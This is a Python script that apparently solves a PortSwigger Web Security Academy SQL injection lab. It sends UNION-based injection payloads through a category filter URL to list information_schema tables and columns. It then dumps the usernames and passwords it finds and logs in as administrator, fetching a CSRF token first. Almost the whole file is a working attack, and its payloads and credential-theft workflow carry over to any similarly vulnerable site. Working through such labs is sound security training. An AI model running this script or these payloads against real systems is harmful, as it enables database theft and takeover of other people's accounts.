#!/usr/bin/env python3
# Lab: SQL injection attack, listing the database contents on non-Oracle databases
# Lab-Link: <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle>
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import re
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_userstable(url):
    payload = f"' UNION SELECT table_name, null FROM information_schema.tables--"
    r = requests.get(f'{url}{payload}', verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find(text=re.compile('^users_'))


def find_credential_colums(url, table):
    payload = f"' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = '{table}'--"
    r = requests.get(f'{url}{payload}', verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    columns = {'usernames': soup.find(text=re.compile('^username_')),
               'passwords': soup.find(text=re.compile('^password_'))}
    if not columns['usernames'] or not columns['passwords']:
        return False
    return columns


def find_credentials(url, table, columns):
    payload = f"' UNION SELECT {columns['usernames']},{columns['passwords']} FROM {table}--"
    r = requests.get(f'{url}{payload}', verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    table = soup.find("table", {"class": "is-table-longdescription"})
    creds = {}
    for tr in table.find_all('tr'):
        creds[tr.findNext('th').text] = tr.findNext('td').text
    if not creds or not creds['administrator']:
        return False
    return creds


def login(host, credentials):
    def get_csrf_token(client, url):
        r = client.get(url)
        soup = BeautifulSoup(r.text, 'html.parser')
        return soup.find('input', attrs={'name': 'csrf'})['value']
    client = requests.Session()
    client.proxies = proxies
    client.verify = False

    url = f"{host}/login"
    csrf = get_csrf_token(client, url)
    if not csrf:
        print(f'[-] Unable to obtain csrf token')
        sys.exit(-2)

    payload = {'csrf': csrf,
               'username': 'administrator',
               'password': credentials['administrator']}
    r = client.post(url, data=payload, allow_redirects=False)
    if r.status_code == 302:
        return True
    return False


if __name__ == '__main__':
    try:
        host = sys.argv[1].strip().rstrip('/')
        category = sys.argv[2].strip()
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST> <CATEGORY>')
        print(f'Example: {sys.argv[0]} Pets')
        sys.exit(-1)

    url = f'{host}/filter?category={category}'
    userstable = find_userstable(url)
    if not userstable:
        print('[-] Unable to find the users table')
        sys.exit(-2)
    print(f'[+] Found users table: {userstable}')

    columns = find_credential_colums(url, userstable)
    if not columns:
        print('[-] Unable to find username/password columns')
        sys.exit(-3)
    print(f'[+] Found colums for username and password: {columns}')

    credentials = find_credentials(url, userstable, columns)
    if not credentials:
        print('[-] Unable to find usernames and passwords')
        sys.exit(-4)
    print(f'[+] Dumping credentials: {credentials}')

    print('[ ] Try to login as administrator')
    if login(host, credentials):
        print('[+] Login as administrator successful')
    else:
        print('[-] Failed to login as administrator')
